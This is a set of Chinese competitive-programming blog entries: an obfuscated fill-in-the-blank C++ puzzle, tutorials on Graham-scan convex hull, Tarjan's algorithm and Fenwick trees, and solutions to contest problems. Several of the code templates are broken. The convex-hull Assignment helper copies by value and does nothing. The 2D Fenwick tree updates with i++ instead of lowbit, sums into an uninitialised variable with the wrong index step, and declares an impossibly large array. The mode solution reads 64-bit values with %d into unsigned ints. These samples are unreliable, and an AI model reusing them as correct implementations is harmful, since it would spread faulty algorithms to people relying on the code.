    <content type="text"><![CDATA[本题为Shq出的一道大水题年轻的二等技官，妖精仓库的管理员，世界上最后一个人类——威廉·克梅修，数百年前曾经是一名准勇者，掌握着成为一名勇者所需要的所有知识。大战在即，调整圣剑的状态成为了一项重要的任务。1234瑟尼欧里斯（セニオリス）圣剑的其中之一，在现存的遗迹兵装中，拥有最强大的力量。拥有非常特殊的资质，只有极少一部分的人才能使用。由四十一个护符组成。能将所有事物包含不死者都回归「死亡」。威廉需要调整圣剑的状态，因此他将瑟尼欧尼斯拆分护符，组成了一个nn 行mm 列的矩阵。每一个护符都有自己的魔力值。现在为了测试圣剑，你需要将这些护符分成 A,B两部分。要求如下：圣剑的所有护符，恰好都属于两部分中的一部分。每个部分内部的方块之间，可以通过上下左右相互到达，而且每个内部的方块之间互相到达，最多允许拐一次弯。例如1234567ＡＡＡＡＡ ＡＡＡＡＡ ＡＡＡＡＡＡＡＢＡＡ ＢａＡＡＡ ＡＡＡＢＢＡＢＢＢＡ ＢＢＡＡＡ ＡＡＡＢＢＡＡＢＡＡ ＢａＡＡＡ ＡＢＢＢＢＡＡＡＡＡ ＡＡＡＡＡ ＢＢＢＢＢ (1) (2) (3)其中(1)(2)是不允许的分法，(3)是允许的分法。在(2)中，a属于A区域，这两个a元素之间互相到达，没有办法最多只拐一次弯。现在要问，所有合法的分法中，A区域的极差与B区域的极差 中间较大的一个的 最小值 是多少？好心而可爱的在一旁默默观察奈芙莲悄悄地告诉你，极差就是区域内最大值减去最小值。夜晚的风吹拂着，68号岛上的景色竟与地上的森林无异。转念又想，黄金妖精本身就是与森林之中出现，成长，消亡的神秘存在啊。时间不早了，早上训练中落败的珂朵莉即将回来了。您要尽快和威廉一起调整好圣剑，千万不能迟哟。输入输出格式输入格式：第一行两个自然数n,mn,m接下来nn 行，每行mm 个自然数A_{i,j}Ai,j 表示权值输出格式：一个整数表示答案。输入输出样例输入样例#1：123454 41 12 6 1111 4 2 1410 1 9 204 17 13 10输出样例#1：111说明样例解释12341 12 6 1111 4 2 1410 1 9 204 17 13 10分法不唯一，如图是一种合法的分法。左边部分极差12-1=11，右边一块极差20-10=10，所以答案取这两个中较大者11。没有别的分法，可以使答案更小。数据范围与约定测试点nm#1-210≤1010≤10#3-412000≤2000#5-7≤200200≤200#8-10≤20002000≤2000对于所有的权值对于这道题自然是很简单的，但是Shq认为这是锻炼你的代码能力的一道题，于是，就给你出成了补全对话模式：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;______&gt;#include &lt;_______&gt;#include &lt;iostream&gt;#define inf ___(2e9)#define nl ____#defien ____using namespace std;int ___,____;int ______________=0,_____________=inf;int _________________[4][2017][2017],_______________=3;bool __________________[2017][2017];void ________(int ___________________,int ____________________)&#123; for(int _=1;_&lt;=___;_++) for(int __=1;__&lt;=____;__++) _________________[____________________][__][___-_ + 1]=_________________[___________________][_][__]; swap(____ ,___);&#125;bool _________(int ________________)&#123; int ____________=____; memset(__________________,0,sizeof(__________________)); for(int _=1;_&lt;=___;_++) for(int __=1;__&lt;=____________;__++) if(_________________[_______________][_][__]+________________&lt;______________)&#123; ____________=__-1;break; &#125;else __________________[_][__] = true; for(int _=___;_; _--) for(___ __=____; __; __--) if(__________________[_][__])break; else if(_________________[_______________][_][__]-________________&gt;_____________)return false; return true;&#125;void ___________()&#123;swap(___,____);_______________=(_______________+1)%4;&#125;bool __________(int ________________)&#123; if(_________(________________)) return true; ___________(); if(_________(________________)) return true; ___________(); if(_________(________________)) return true; ___________(); if(_________(________________)) return true; ___________(); return false; &#125;int main()&#123;#ifdef ____ freopen("______", "__", ____); _______("______", "__", ____);#_____ _____("%d%d",&amp;___,&amp;____); for(int _=_;_&lt;=___;_++)for(int __=_;__&lt;=____;__++)&#123; ______("%d",&amp;_________________[0][_][__]); ______________=max(______________,_________________[0][_][__]); _____________=min(_____________,_________________[0][_][__]); &#125; ________(0,1);________(__,__);________(2,3); int _____=0,______=______________-_____________; while(_____&lt;______)&#123; int _______=_____+______ &gt;&gt; _; if(__________(_______))______=_______; else _____=_______+1; &#125; printf("__",_____);&#125;// _______ end填完的各位dalao可以发到我的QQ上或者是邮箱哦]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Chtholly</tag>
        <tag>Problems</tag>
        <tag>矩阵</tag>
        <tag>二分</tag>
        <tag>矩阵翻转</tag>
        <tag>最优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[凸包「graham算法」]]></title>
    <url>%2Farticles%2Ftubaomb%2F</url>
    <content type="text"><![CDATA[凸包（Convex Hull）是一个计算几何（图形学）中的概念。在一个实数向量空间V中，对于给定集合X，所有包含X的凸集的交集S被称为X的凸包。X的凸包可以用X内所有点(X1，...Xn)的凸组合来构造.在二维欧几里得空间中，凸包可想象为一条刚好包着所有点的橡皮圈。用不严谨的话来讲，给定二维平面上的点集，凸包就是将最外层的点连接起来构成的凸多边型，它能包含点集中所有的点。凸包最常用的凸包算法是Graham扫描法和Jarvis步进法Graham&#39;s Scan法这个算法是由数学大师葛立恒（Graham）发明的，他曾经是美国数学学会（AMS）主席、AT&amp;T首席科学家以及国际杂技师协会（IJA）主席。问题给定平面上的二维点集，求解其凸包。过程把所有点放在二维坐标系中，则纵坐标最小的点一定是凸包上的点，如图中的P0。把所有点的坐标平移一下，使 P0 作为原点，如上图。计算各个点相对于 P0 的幅角 α ，按从小到大的顺序对各个点排序。当 α 相同时，距离 P0 比较近的排在前面。例如上图得到的结果为 P1，P2，P3，P4，P5，P6，P7，P8。我们由几何知识可以知道，结果中第一个点 P1 和最后一个点 P8 一定是凸包上的点。------（以上是准备步骤，以下开始求凸包）-------以上，我们已经知道了凸包上的第一个点 P0 和第二个点 P1，我们把它们放在栈里面。现在从步骤3求得的那个结果里，把 P1 后面的那个点拿出来做当前点，即 P2 。接下来开始找第三个点：连接P0和栈顶的那个点，得到直线 L 。看当前点是在直线 L 的右边还是左边。如果在直线的右边就执行步骤5；如果在直线上，或者在直线的左边就执行步骤6。如果在右边，则栈顶的那个元素不是凸包上的点，把栈顶元素出栈。执行步骤4。当前点是凸包上的点，把它压入栈，执行步骤7。检查当前的点 P2 是不是步骤3那个结果的最后一个元素。是最后一个元素的话就结束。如果不是的话就把 P2 后面那个点做当前点，返回步骤4。动态求解：代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;// 数据结构#include &lt;vector&gt;#include &lt;stack&gt;// 文件锁#define LOCKconst int MAXN = 500;const int INT_MAX = (1 &lt;&lt; 16) - 1;// 建议不加using namespace std;// using namespace std;int pointNum;int lowestIndex;struct Point&#123; int x, y;&#125;;Point points[MAXN];Point lowestPoint;std::stack&lt;Point&gt; pointStack;//听说手写max,min,spaw 运行速度会加快inline void spaw(int&amp; a, int&amp; b)&#123;a ^= b ^= a ^= b;&#125;inline int max (int i, int j) &#123;return i &gt; j ? i : j;&#125;inline int min (int i, int j) &#123;return i &lt; j ? i : j;&#125;// 赋值static void Assignment(Point from, Point to)&#123; from.x = to.x; from.y = to.y;&#125;bool checkNeedToSwap(int x1, int y1, int x2, int y2)&#123; if ((x1 - lowestPoint.x)*(y2 - lowestPoint.y) - (x2 - lowestPoint.x)*(y1 - lowestPoint.y) &gt; 0) return true; else return false;&#125;// 给点排序void sortPoints()&#123; bool flag; int tmp[2]; for (int i = 1; i &lt; pointNum; i++)&#123; flag = true; for (int j = pointNum - 1; j &gt; i; j--)&#123; if (checkNeedToSwap(points[j].x, points[j].y, points[j - 1].x, points[j - 1].y))&#123; tmp[0] = points[j - 1].x; tmp[1] = points[j - 1].y; Assignment(points[j - 1], points[j]); points[j].x = tmp[0]; points[j].y = tmp[1]; flag = false; &#125; &#125; if (flag) break; &#125;&#125;// 算法本体void graham()&#123; int index = 3; pointStack.push(points[0]); pointStack.push(points[1]); pointStack.push(points[2]); while (index &lt; pointNum)&#123; Point point2 = pointStack.top(); pointStack.pop(); Point point1 = pointStack.top(); Point point3 = points[index]; /* Debug * cout &lt;&lt; "p1(" &lt;&lt; point1.x &lt;&lt; " " &lt;&lt; point1.y &lt;&lt; ")" &lt;&lt; endl; * cout &lt;&lt; "p2(" &lt;&lt; point2.x &lt;&lt; " " &lt;&lt; point2.y &lt;&lt; ")" &lt;&lt; endl; * cout &lt;&lt; "p3(" &lt;&lt; point3.x &lt;&lt; " " &lt;&lt; point3.y &lt;&lt; ")" &lt;&lt; endl; */ int tmp = (point3.x - point1.x)*(point2.y - point1.y) - (point2.x - point1.x)*(point3.y - point1.y); while (tmp &gt; 0)&#123; point2 = point1; pointStack.pop(); point1 = pointStack.top(); tmp = (point3.x - point1.x)*(point2.y - point1.y) - (point2.x - point1.x)*(point3.y - point1.y); &#125; pointStack.push(point2); pointStack.push(point3); index++; &#125;&#125;inline void SlowPrint(int test)&#123; printf ("%d\n", test);&#125;inline void PrintAnswer(std::vector&lt;Point&gt; vec)&#123; for(std::vector&lt;Point&gt;::reverse_iterator iter=vec.rbegin(); iter!=vec.rend(); iter++) std::cout &lt;&lt; iter-&gt;x &lt;&lt; " " &lt;&lt; iter-&gt;y &lt;&lt; std::endl;&#125;int main(int argc, char* argv[])&#123;#ifdef LOCK freopen ("test.in" , "r", stdin ); freopen ("test.out", "w", stdout);#endif int T; std::cin &gt;&gt; T; while(T--)&#123; lowestPoint.x = INT_MAX; lowestPoint.y = INT_MAX; std::cin &gt;&gt; pointNum; for (int i = 0; i &lt; pointNum; i++)&#123; std::cin &gt;&gt; points[i].x &gt;&gt; points[i].y; //find the lowest point if (lowestPoint.y &gt; points[i].y || (lowestPoint.y == points[i].y &amp;&amp; lowestPoint.x &gt; points[i].x))&#123; Assignment (lowestPoint, points[i]); lowestIndex = i; &#125; &#125; /* swap lowestPoint to first place. * points[lowestIndex].x = points[0].x; * points[lowestIndex].y = points[0].y; * points[0].x = lowestPoint.x; * points[0].y = lowestPoint.y; */ Assignment (points[lowestIndex], points[0]); Assignment (points[0], lowestPoint); sortPoints(); graham(); SlowPrint (T + 1); SlowPrint (pointStack.size()); std::vector&lt;Point&gt; vec; while (!pointStack.empty()) &#123; Point p = pointStack.top(); vec.push_back(p); pointStack.pop(); &#125; PrintAnswer(vec); &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>算法</tag>
        <tag>模板</tag>
        <tag>凸包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「题解」多段线(polyline)]]></title>
    <url>%2Farticles%2Ftest-polyline%2F</url>
    <content type="text"><![CDATA[多段线(polyline)【题目描述】【输入格式】从文件polyline . in中读入数据。 输入第一行包含一个正整数 ,表示函数个数。 接下来n 行 , 每行包含两个正整数ki , bi,表示第i个函数的参数。【输出格式】输出到文件portal . out中。 输出一行一个正整数,表示形成的多段线的图像中不等于180度角的个数【样例 输入】1 1 1 0【样例 输出】1 1【样例 输入】3 -2 -4 1 7 -5 1【样例 输出】3【提示】函数相关参见高中数学必修 。(看了也没用) 请认真阅读【数据规模及约定】。【数据规模及约定】保证对于所有数据有: 本题评测时将开启 O2 优化。注意，本题中函数&lt;=180度的角就是函数的拐点，也就是说，就是让你求函数的拐点那么，我们来研究下样例：对于样例一就很明显了，我们就研究下最后一个样例我们看下图像：现在，我们计算一下s(x)的值这就是s(x)的值．明显的，这个函数有3个拐点（一个在x=7的地方，不容易看出来）我们就来研究一下这几个函数的关系：上图就显示了所有函数．我们可以计算这些函数的零点（与x轴交点）来判断有多少个拐点各个分函数不同的零点数就是总函数的拐点数思路明白了，代码就好写了代码:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;algorithm&gt;#include &lt;vector&gt;typedef long double lb;const int MAXN = 100000 + 5;// 文件锁#define LOCKint number, cnt=0;std::vector&lt;int&gt; Data_k;std::vector&lt;int&gt; Data_b;lb withx[MAXN];void init()&#123; scanf("%d", &amp;number); for(int i = 1; i &lt;= number; i++)&#123; int ki, bi; scanf("%d %d", &amp;ki, &amp;bi); if(ki != 0)&#123; cnt++; Data_k.push_back(ki); Data_b.push_back(bi); //求出与函数零点 withx[cnt] = -(lb)Data_b[cnt] / (lb)Data_k[cnt]; &#125; &#125;&#125;int main(int argc, char const *argv[]) &#123; // 文件#ifdef LOCK freopen ("polyline.in" , "r", stdin ); freopen ("polyline.out", "w", stdout);#endif init(); //去重 std::sort(withx + 1,withx + 1 + number); int Answer = cnt; for(int i = 1; i &lt;= cnt; i++) if(withx[i] - withx[i - 1] &lt;= 1e-18) Answer--; printf("%d", Answer); return 0;&#125;// Wonderful end最后给下函数解析式]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「题解」众数(mode)]]></title>
    <url>%2Farticles%2Ftest-mode%2F</url>
    <content type="text"><![CDATA[这是一道十分水锻炼思维的题目众数(mode)【题目描述】给你一个包含n个数的数列,其中某个数出现了超过 n/2 次即众数,请你找出那个数。【输入格式】从文件mode . in中读入数据。 输入第一行包含一个正整数n ,表示数列中数的个数。 接下来一行包含n个正整 数,分别表示数列中的每个数。【输出格式】输出到文件mode . out中。 输出一行一个正整数,为数列中的众数。【样例输入】5 3 2 3 1 3【样例输出】3【提示】请注意本题空间限制!【数据规模及约定】保证对于所有数据有: n ≤ 500000, 0 ≤ a i ≤ 9223372036854775807 切勿弃疗!如果不看空间，那么这道题就是十分水的一道题目但是，我们看到空间1MB的时候就会发现，我们其实连数组都没地方开，只有1MB的空间，也就是说我们只能开几个int了233那么，我们就只能使用这三四个变量来去进行我们的算法了这里我就推荐一种十分神奇的方法： 暴力抵消法抵消法 是一个 法师套牌 十分有效的办法，实现简单，造假低廉．我们注意到，题目中给出了＂超过 n/2 次＂ 这个条件, 那么我们可以设一个变量tag(1)，当现在输入的x与记录的x不同时,tag = tag - 1, 当相同时，tag = tag + 1．当tag &lt;= 1时，江x更新为现在输入的x．显然这个算法是显然成立的Code:1234567891011121314151617181920212223242526272829#include &lt;cstdio&gt;//文件锁，可以编译时带参数编译#define LOCKtypedef unsigned int ui;ui number;ui x = 0, tag = 1, data;void solve()&#123; for (ui i = 1; i &lt;= number; i++) &#123; scanf("%d", &amp;data); tag += data == x ? 1 : -1; if (tag &lt;= 1) x = data, tag = 1; &#125;&#125;int main(int argc, char const *argv[]) &#123;#ifdef LOCK freopen ("mode.in" , "r", stdin ); freopen ("mode.out", "w", stdout);#endif scanf("%d", &amp;number); solve(); printf("%d", x); return 0;&#125;// wonderful end]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>优化</tag>
        <tag>Problem</tag>
        <tag>高性能</tag>
        <tag>测试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[P2018]消息传递]]></title>
    <url>%2Farticles%2FP2018%2F</url>
    <content type="text"><![CDATA[今年是2018年，我就去Luogu上刷了一道代号为2018的水题.然而这道题是道大水题，用树上DP完美解决思路:枚举第一个放的位置，dfs递归处理出当前节点u的子节点v需要的传递时间，然后从大到小排序，对于传递时间长的节点，就先传递给它。AC代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;const int mxn=1005;std::vector &lt;int&gt; f[mxn];int n,x,maxx;int ans[mxn],dp[mxn],du[mxn];// 听说手写min,max会跑的快inline int min(int a, int b)&#123;return a &lt; b ? a : b;&#125;inline int max(int a, int b)&#123;return a &gt; b ? a : b;&#125;// dfsinline void dfs(int u,int fa)&#123; if(fa &amp;&amp; du[u]==1) return; int tmp[mxn],cnt=0; for(int i=0;i&lt;f[u].size();i++)&#123; int v=f[u][i]; if(v==fa) continue; dfs(v,u); tmp[++cnt]=dp[v]; &#125; std::sort(tmp+1,tmp+cnt+1); for (int i = 1; i &lt;= cnt; i++) dp[u]=max(dp[u],tmp[i]+cnt-i+1);&#125;int main(int argc, char const *argv[]) &#123; scanf("%d",&amp;n); for (int i = 2; i &lt;= n; i++)&#123; scanf("%d",&amp;x); f[x].push_back(i); f[i].push_back(x); &#125; for (int i = 1; i &lt;= n; i++)&#123; memset(dp,0,sizeof dp); dfs(i,0); ans[i]=dp[i]; maxx = (i == 1) ? dp[i] : maxx; maxx=min(maxx,ans[i]); &#125; printf("%d\n",maxx+1); for (int i = 1; i &lt;= n; i++) if(ans[i]==maxx) printf("%d ",i); printf("\n"); return 0;&#125;// 完美结束]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>Problem</tag>
        <tag>动态规划</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[联通分量&&Tarjian算法]]></title>
    <url>%2Farticles%2Fscc1%2F</url>
    <content type="text"><![CDATA[子图（subgraph）图G=(V，E)，G’=(V’，E’)中，若V’ V，E’ E，并且E’中的边所关联的顶点都在V’中，则称图G’是图G的子图强连通性:对有向图G=(V,E)而言，若对于G中任意两个顶点Vi和Vj（Vi≠Vj ），都有一条从Vi到Vj的（有向路径），同时还有一条从Vj到Vi的(有向)路径，则称有向图G是强连通的强联通分量:有向图强连通的极大子图Tarjian算法Tarjan算法用于求有向图强连通分量当然，这个算法是非常实用的算法，你也可以叫他什么塔尖算法，铊剑算法之类的233过程其过程主要如下：做一遍DFS，用dfn[i]表示编号为i的节点在DFS过程中的访问序号(也可以叫做开始时间）用low[i]表示i节点DFS过程中i的下方节点所能到达的开始时间最早的节点的开始时间。初始时dfn[i]=low[i]在DFS过程中会形成一搜索树。在搜索树上越先遍历到的节点，显然dfn的值就越小。DFS过程中，碰到哪个节点，就将哪个节点入栈。栈中节点只有在其所属的强连通分量已经全部求出时，才会出栈。如果发现某节点u有边连到搜索树中栈里的节点v，则更新u的low 值为dfn[v](更新为low[v]也可以）。如果一个节点u已经DFS访问结束，而且此时其low值等于dfn值，则说明u可达的所有节点，都不能到达任何在u之前被DFS访问的节点，那么该节点u就是一个强连通分量在DFS搜索树中的根。此时将栈中所有节点弹出，包括u,就找到了一个强连通分量代码自己写123456789101112131415161718192021By - lydvoid Tarjan(u) &#123; dfn[u]=low[u]=++index stack.push(u) for each (u, v) in E &#123; if (v is not visted) &#123; tarjan(v) low[u] = min(low[u], low[v]) &#125; else if (v in stack) &#123; low[u] = min(low[u], dfn[v]) &#125; &#125; if (dfn[u] == low[u]) &#123; //u是一个强连通分量的根 repeat v = stack.pop print v until (u== v) &#125; //退栈，把整个强连通分量都弹出来&#125; //复杂度是O(E+V)的// 完美结束双联通分量无向图的割点与桥无向连通图中，如果删除某点后，图变成不连通，则称该点为割点。 无向连通图中，如果删除某边后，图变成不连通，则称该边为桥。双联通分量如果一个连通图，如果任意两点至少存在两条“点不重复”的路径，则说明这个图是点-双联通的，同时这个条件等价于任意两条边都在同一个简单环内，图内无割点（简称双连通）点双连通分量——一个图点-双联通的极大联通子图如果任意两点至少存在两条“边不重复”的路径，我们认为这个图是边-双联通的，即每条边都在一个简单环内，所有边都不是桥边双联通分量——一个图边-双联通的极大联通子图边双连通只需在求出所有的桥以后，把桥边删除，原图变成了多个连通块，则每个连通块就是一个边双连通分支。桥不属于任何一个边双连通分支，其余的边和每个顶点都属于且只属于一个边双连通分支。Tarjan 求割点与桥思路和有向图求强连通分量类似在深度优先遍历整个图过程中形成的一棵搜索树一个顶点u是割点，当且仅当满足以下两个条件之一1. u为树根，且u有多于一个子树。 2. u不为树根，且满足存在(u,v)为树枝边(或称父子边，即u为v在搜索树中的父亲)，使得dfn(u)&lt;=low(v). 一条无向边(u,v)是桥，当且仅当(u,v)为树枝边，且满足dfn(u)&lt;low(v)（前提是其没有重边）。low[u]为u与u的子树中能够通过非父子边追溯到的最早节点的DFS序代码12345678910111213141516void Tarjan(int u, int father)&#123; int i,j,k; low[u] = dfn[u] = nTime ++; for( i = 0;i &lt; G[u].size() ;i ++ ) &#123; int v = G[u][i]; if( ! dfn[v]) &#123; //v没有访问过 //树边要入栈 Edges.push_back(Edge2(u,v)); Tarjan(v,u); low[u] = min(low[u],low[v]); Edge2 tmp(0,0); if(dfn[u] &lt;= low[v]) &#123; //从一条边往下走，走完后发现自己是割点，则栈中的边一定全是和自己在一个双连通分量里面 //根节点总是和其下的某些点在同一个双连通分量里面 cout &lt;&lt; "Block No: " &lt;&lt; ++ nBlockNo &lt;&lt; endl;Tarjian求双联通分量代码1234567891011121314151617181920212223242526272829303132333435//by - lydvoid Tarjan(int u, int father)&#123; int i,j,k; low[u] = dfn[u] = nTime ++; for( i = 0;i &lt; G[u].size() ;i ++ ) &#123; int v = G[u][i]; if( ! dfn[v]) &#123; //v没有访问过 //树边要入栈 Edges.push_back(Edge2(u,v)); Tarjan(v,u); low[u] = min(low[u],low[v]); Edge2 tmp(0,0); if(dfn[u] &lt;= low[v]) &#123; //从一条边往下走，走完后发现自己是割点，则栈中的边一定全是和自己在一个双连通分量里面 //根节点总是和其下的某些点在同一个双连通分量里面 cout &lt;&lt; "Block No: " &lt;&lt; ++ nBlockNo &lt;&lt; endl; do &#123; tmp = Edges.back(); Edges.pop_back (); cout &lt;&lt; tmp.u &lt;&lt; "," &lt;&lt; tmp.v &lt;&lt; endl; &#125;while ( ! (tmp.u == u &amp;&amp; tmp.v == v) ); &#125; &#125; // 对应if( ! dfn[v]) &#123; else &#123; if( v != father ) &#123;//u连到父节点的回边不考虑 low[u] = min(low[u],dfn[v]); if( dfn[u] &gt; dfn[v]) //子孙连接到祖先的回边要入栈，但是子孙连接到自己的边，此处肯定已经入过栈了，不能再入栈 Edges.push_back(Edge2(u,v)); &#125; &#125; &#125; //对应 for( i = 0;i &lt; G[u].size() ;i ++ ) &#123;&#125;Tarjian求边双联通分量代码请大家当作课后作业，顺便把代码发给我给你测数据]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>图论</tag>
        <tag>图</tag>
        <tag>Tarjian</tag>
        <tag>强联通</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[Shq]Wyh买卡包]]></title>
    <url>%2Farticles%2FShqProblem1%2F</url>
    <content type="text"><![CDATA[题目描述一天，Wyh到了卡包零售店，要买卡包但是，他到了零售点后，店长告诉他，今天已经没有零售的卡包了，只有N套成套的卡包了。Wyh经过千辛万苦才到达了零售店，他绝对不会不买的，他今天带了M元，他想买尽可能多的卡包，但是他并不想自己算，毕竟太费脑子了，那请你帮他算算，他买那种套装更实惠输入 &amp;&amp; 输出描述输入描述第一行输入两个数，分别为Wyh带的钱数M和卡包的套数N接下来N行，每行2个数据，分别代表套装需要的钱数 pn 和 套装中的包数 qn输出描述输出共一行，输出买了的套装数 及 共有多少包输入&amp;&amp;输出样例输入样例12345400 4128 3060 7388 60328 48输出样例11 60数据范围单点1s / 128MB数据范围对于30%的数据0 &lt;= N &lt;= 10 ^ 3，0 &lt;= M &lt;= 10对于50%的数据0 &lt;= N &lt;= 10 ^ 3，0 &lt;= M &lt;= 40对于80%的数据0 &lt;= N &lt;= 10 ^ 4，0 &lt;= M &lt;= 100对于100%的数据0 &lt;= N &lt;= 10 ^ 5，0 &lt;= M &lt;= 150]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Problem</tag>
        <tag>题目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二维树状数组]]></title>
    <url>%2Farticles%2FTreeArray2%2F</url>
    <content type="text"><![CDATA[二维树状数组就是一维树状数组 * 2然而，一维树状数组就是对二维树状数组进行降维打击（雾首先，我们来看一个update的代码：1234void update(int Abscissa, int Ordinate, int Increment)&#123; for (int i = Abscissa; i &lt;= size_x; i++) for (int j = Ordinate; j &lt;= size_y; j++) TreeArray[i][j] += Increment;&#125;可见，二维树状数组就是对一维树状数组加一个j那这就不用浪费时间了，直接上代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;// 文件锁//#define FILELOCKtypedef long long LL;const int MAXN = 100010;int TreeArray[MAXN][MAXN];int size_x, size_y, qNumber;int LowBit(int value)&#123; return (value &amp; -value);&#125;// Shq: 下面函数中的// Abscissa:横坐标// Ordinate:纵坐标// Increment:增量void update(int Abscissa, int Ordinate, int Increment)&#123; for (int i = Abscissa; i &lt;= size_x; i++) for (int j = Ordinate; j &lt;= size_y; j++) TreeArray[i][j] += Increment;&#125;int query(int Abscissa, int Ordinate)&#123; int Sum = 0; for (int i = Abscissa; i &gt;= 1; i -= LowBit(i)) for (int j = Ordinate; j &gt;= 1; j -= LowBit(j)) Sum += TreeArray[i][j]; return Sum;&#125;int Read(int Abscissa, int Ordinate)&#123; int value; for (int i = Abscissa; i &gt;= 1; i -= LowBit(i)) for (int j = Ordinate; j &gt;= 1; j -= LowBit(i)) value += TreeArray[i][j]; return value;&#125;void SlowRead(int&amp; x)&#123; scanf("%d", &amp;x);&#125;inline void Solve(int Kind)&#123; // 1表示更新单个点 if (Kind == 1) &#123; int posx, posy, value; SlowRead(posx); SlowRead(posy); SlowRead(value); update (posx, posy, value); &#125; // 2表示查询单个节点的值 else if (Kind == 2) &#123; int posx, posy; SlowRead(posx); SlowRead(posy); printf("%d\n", Read(posx, posy)); &#125; // 3表示求和 else if (Kind == 3) &#123; int posx, posy; SlowRead(posx); SlowRead(posy); printf ("%d", query(posx , posy)); &#125; //其他情况 else printf("???");&#125;int main(int argc, char const *argv[]) &#123;#ifdef FILELOCK freopen ("test.in" , "r", stdin ); freopen ("test.out", "w", stdout);#endif SlowRead(size_x); SlowRead(size_y); SlowRead(qNumber); for (int i = 1; i &lt;= size_x; i++) for (int j = 1; j &lt;= size_y; j++)&#123; int k; SlowRead(k); update(i, j, k); &#125; for (int i = 1; i &lt;= qNumber; i++)&#123; int Kind; SlowRead(Kind); Solve(Kind); &#125; printf("------End------"); return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>模板</tag>
        <tag>优化</tag>
        <tag>树状数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树状数组]]></title>
    <url>%2Farticles%2FTreeArray%2F</url>
    <content type="text"><![CDATA[树状数组 重点是在树状的数组大家都知道二叉树吧 叶子结点代表A数组A[1]~A[8]Tree array is focused on the tree array We all know that binary tree it Leaf nodes represent A array A [1] ~ A [8]现在变形一下Now deformation现在定义每一列的顶端结点C[]数组 如下图Now define the top node of each column C [] array As shown belowC[i]代表 子树的叶子结点的权值之和// 这里以求和举例 如图可以知道C [i] represents the sum of the weights of the leaf nodes of the subtree // here for summation example As figure can knowC[1]=A[1]; C[2]=A[1]+A[2]; C[3]=A[3]; C[4]=A[1]+A[2]+A[3]+A[4]; C[5]=A[5]; C[6]=A[5]+A[6]; C[7]=A[7]; C[8]=A[1]+A[2]+A[3]+A[4]+A[5]+A[6]+A[7]+A[8];下面观察如下图Below observe the following figure将C[]数组的结点序号转化为二进制The C [] array node number into binary1=(001) C[1]=A[1]; 2=(010) C[2]=A[1]+A[2]; 3=(011) C[3]=A[3]; 4=(100) C[4]=A[1]+A[2]+A[3]+A[4]; 5=(101) C[5]=A[5]; 6=(110) C[6]=A[5]+A[6]; 7=(111) C[7]=A[7]; 8=(1000) C[8]=A[1]+A[2]+A[3]+A[4]+A[5]+A[6]+A[7]+A[8];不难看出这和二进制有关系而对于C[i] 我们不妨设 a = i 的二进制中从最低位到高位连续零的长度对照式子可以发现 C[i]=A[i-a+1]+A[i-a+2]+......A[i]; 例如i=8时，a=3; 可以自行带入验证;这时候，我们就会发现怎么求这个长度呢？ 其实这个长度就是 i &amp; (-i)证明：It is not hard to see that this has a relationship with the binaryFor C [i] we may as well set the length of a = i binary from the lowest to the highest continuous zeroFor example, when i = 8, a = 3; for example, C = i [i- Can bring it into verificationAt this time, we will find how to seek this length? In fact, this length is i &amp; (-i)prove:首先明白一个概念，计算机中-i=（i的取反+1），也就是i的补码 而lowbit，就是求（树状数组中）一个数二进制的1的最低位，例如01100110，lowbit=00000010；再例如01100000，lowbit=00100000。 所以若一个数（先考虑四位）的二进制为abcd，那么其取反为(1-a)(1-b)(1-c)(1-d)，那么其补码为(1-a)(1-b)(1-c)(2-d)。 如果d为1，什么事都没有-_-|||但我们知道如果d为0，天理不容2Σ( ° △ °|||)︴ 于是就要进位。如果c也为0，那么1-b又要加1，然后又有可能是1-a……直到碰见一个为补码为0的bit，我们假设这个bit的位置为x 这个时候可以发现：是不是x之前的bit的补码都与其自身不同？，x之后的补码与其自身一样都是0？ 例如01101000，反码为10010111，补码为10011000，可以看到在原来数正数第五位前，补码的进位因第五位使其不会受到影响，于是0&amp;1=0； 但在这个原来数1后，所有零的补码都会因加1而进位，导致在这个1后所有数都变成0，再加上0&amp;0=0，所以他们运算结果也都是零； 只有在这个数处，0+1=1，连锁反应停止，所以这个数就被确定啦O(∩_∩)O 所以and以后只有x这个bit是一……First understand a concept, the computer -i = (i + 1), that is, the complement of i The lowbit, is seeking (tree array) a number of binary 1 of the lowest, such as 01100110, lowbit = 00000010; then for 